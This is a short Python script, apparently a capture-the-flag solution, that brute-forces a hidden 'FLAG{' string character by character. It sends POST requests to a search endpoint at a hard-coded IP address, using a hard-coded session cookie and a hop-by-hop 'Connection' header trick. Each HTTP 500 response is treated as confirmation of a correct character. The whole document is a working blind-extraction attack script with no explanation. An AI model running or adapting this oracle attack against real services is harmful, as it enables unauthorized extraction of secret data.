from requests import get, post
from string import printable
from re import findall

# Code not mine, forgot the name of the author please open an issue about it if you find this code :)

# init
cookies = {
    "session": "eyJjc3JmX3Rva2VuIjoiN2M2MTIyOTZhZWRmZGNhM2RjYWYwYmE1ZGE4MDJlODE1MGU5MDI2NSIsInVzZXJuYW1lIjoiaG9ja2FnZSJ9.Y6GIIg.0KKUmMz-uzqJdmb9Ai5uRym9HSQ"
}
flag = "FLAG{"

while 1:
    # search query
    for letter in printable:
        url = "http://34.204.107.224/search"
        headers = {
            "Connection": "User-Agent" # hop by hop
        }
        data = {
            "query": flag + letter
        }

        r = post(url, cookies=cookies, headers=headers, data=data)
        if r.status_code == 500:
            print("LETTER FOUND!", flag + letter)
            flag += letter
            break
        else:
            print("Testing:", flag + letter)
    # no letter found, end of flag
    else:
        exit()